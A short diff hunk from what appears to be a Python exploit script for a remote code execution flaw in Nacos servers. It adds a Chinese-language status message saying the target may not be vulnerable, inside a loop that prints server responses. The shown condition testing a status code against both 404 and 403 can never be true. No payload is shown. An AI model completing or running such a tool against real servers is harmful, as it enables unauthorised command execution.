@@ -37,6 +37,7 @@ def exploit(target, command, service):
         print("正在进行碰撞!!")
         print(post_json)
         if post_json['code'] == 404 and post_json['code'] == 403 and "File" not in post_json['message']:
+            print(Fore.YELLOW + f"\n[+] {target} 可能不存在Nacos_Rce漏洞，执行命令：{command}" + Fore.RESET)
             break
         if post_json.get('message', None) is None and post_json.get('data', None) is not None:
             print(post_resp.text)
